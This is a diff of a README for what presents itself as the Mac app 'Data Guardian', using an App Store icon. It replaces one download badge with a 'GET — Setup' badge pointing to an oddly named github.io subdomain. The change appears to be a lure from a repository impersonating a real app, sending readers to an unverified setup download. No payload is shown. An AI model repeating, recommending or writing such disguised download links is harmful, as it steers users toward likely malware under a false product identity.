@@ -4,11 +4,7 @@
 <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple113/v4/91/4a/98/914a98db-fe6f-a07a-6f9a-911935352338/AppIcon-0-0-1x_U007emarketing-0-0-0-7-0-0-85-220.png/1200x600wa.png" alt="Data Guardian Logo" width="256" height="256">  
 </div>  
 
-<div align="center">  
-<a href="https://agapattiede.github.io/.github/dataguardian">  
-<img src="https://img.shields.io/badge/Download_Data_Guardian_for_Mac-darkgreen?style=for-the-badge&logo=apple" alt="Download Data Guardian for Mac">  
-</a>  
-</div>  
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://glorywoolumroqxrn.github.io/.github/Data-Guardian)
 
 ---
 
